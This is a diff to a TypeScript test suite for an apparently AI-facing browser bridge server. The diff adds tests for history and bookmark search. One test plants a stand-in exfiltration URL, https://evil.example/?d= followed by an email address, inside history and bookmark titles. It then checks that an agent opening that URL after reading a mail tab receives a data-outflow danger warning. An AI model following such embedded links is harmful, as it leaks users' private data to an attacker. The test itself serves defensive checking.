@@ -1541,10 +1541,10 @@ const c = { text: "C", url: "https://exemple.fr/c" };
 
 async function withSearch(
   attempt: (o: { call: (name: string, args: Record<string, unknown>, token?: string, onprogress?: (n: number) => void) => Promise<{ text: string; isError: boolean }>; token: string; fake: FakeBridge; search: SearchSessions; s: Awaited<ReturnType<typeof startMcpServer>>; bands: [string, Band | null][]; policy: AccessPolicy }) => Promise<void>,
-  opts: { privateWindows?: string[]; allow?: boolean; emptySpanMs?: number; address?: boolean | "wait" | "later"; failing?: string[]; hanging?: string[]; readPageMs?: number; heartbeatMs?: number; watcher?: Watcher; withUserData?: boolean; history?: { results: HistoryResult[]; texts?: KeptPage[] }; sites?: Record<string, string[]>; recaps?: boolean; notes?: BrowsingNotes; idleMs?: number; onActivity?: (a: { tab: string; label: string }) => void; outflow?: Outflow; tabs?: TabInfo[]; widgets?: WidgetsTools } = {},
+  opts: { privateWindows?: string[]; allow?: boolean; emptySpanMs?: number; address?: boolean | "wait" | "later"; failing?: string[]; hanging?: string[]; readPageMs?: number; heartbeatMs?: number; watcher?: Watcher; withUserData?: boolean; history?: { results: HistoryResult[]; texts?: KeptPage[] }; sites?: Record<string, string[]>; bookmarks?: { title: string; url: string }[]; recaps?: boolean; notes?: BrowsingNotes; idleMs?: number; onActivity?: (a: { tab: string; label: string }) => void; outflow?: Outflow; tabs?: TabInfo[]; widgets?: WidgetsTools } = {},
 ) {
   const principal = generateToken();
-  const fake = new FakeBridge(opts.tabs ?? [github], { active: "github", allow: opts.allow ?? false, ...(opts.withUserData ? { history: opts.history ?? { results: [] }, bookmarks: [], widgetData: true } : {}), search: { privateWindows: opts.privateWindows ?? [], failing: opts.failing ?? [], hanging: opts.hanging ?? [] }, ...(opts.address !== undefined ? { address: opts.address } : {}), ...(opts.sites ? { sites: opts.sites } : {}) });
+  const fake = new FakeBridge(opts.tabs ?? [github], { active: "github", allow: opts.allow ?? false, ...(opts.withUserData ? { history: opts.history ?? { results: [] }, bookmarks: opts.bookmarks ?? [], widgetData: true } : {}), search: { privateWindows: opts.privateWindows ?? [], failing: opts.failing ?? [], hanging: opts.hanging ?? [] }, ...(opts.address !== undefined ? { address: opts.address } : {}), ...(opts.sites ? { sites: opts.sites } : {}) });
   const bands: [string, Band | null][] = [];
   const search = new SearchSessions({ show: (id, band) => bands.push([id, band]), ...(opts.idleMs ? { idleMs: opts.idleMs } : {}) });
   const policy = new AccessPolicy();
@@ -3009,6 +3009,32 @@ test("a history entry on an open site app's domains is not a followed link (the 
     await call("open_tab", { url, reason: "r" });
     expect((fake.calls.find((x) => x.method === "askAddress")!.args[0] as { danger?: string }).danger).toContain("mail.google.com");
   }, { outflow: new Outflow(), tabs: [github, mailTab, app], sites: { vidola: ["vidola-a.example"] }, address: true, withUserData: true, history: { results: [{ url, title: "Vidola", lastVisit: "2026-11-19T10:00:00.000Z", visits: 1, excerpt: "" }] } });
+});
+
+test("an address inside a history or bookmark title is not a followed link, even on a site that is not local", async () => {
+  const mail = "camille.roussel@example.com";
+  const evil = `https://evil.example/?d=${mail}`;
+  const danger = OUTFLOW_DANGER({ kind: "email", masked: mask(mail), source: "mail.google.com" });
+  for (const via of ["search_history", "search_bookmarks"]) {
+    await withSearch(async ({ call, fake, policy }) => {
+      policy.grantHistory();
+      policy.grant(mailTab);
+      expect((await call(via, { query: "x" })).text).toContain(evil);
+      await call("read_tab", { id: "gmail" });
+      await call("open_tab", { url: evil, reason: "r" });
+      expect(fake.calls.find((x) => x.method === "askAddress")!.args[0]).toMatchObject({ danger });
+    }, { outflow: new Outflow(), tabs: [github, mailTab], address: true, withUserData: true, bookmarks: [{ title: `Lien ${evil}`, url: "https://blog.example/" }], history: { results: [{ url: "https://blog.example/", title: `Lien ${evil}`, lastVisit: "2026-11-19T10:00:00.000Z", visits: 1, excerpt: "" }] } });
+  }
+});
+
+test("a history search still answers when the tab list fails", async () => {
+  await withSearch(async ({ call, fake, policy }) => {
+    policy.grantHistory();
+    fake.listTabs = () => Promise.reject(new Error("gone"));
+    const r = await call("search_history", { query: "x" });
+    expect(r.isError).toBe(false);
+    expect(r.text).toContain("https://blog.example/");
+  }, { outflow: new Outflow(), withUserData: true, history: { results: [{ url: "https://blog.example/", title: "Blog", lastVisit: "2026-11-19T10:00:00.000Z", visits: 1, excerpt: "" }] } });
 });
 
 test("a history entry's own address is a followed link: no red line", async () => {
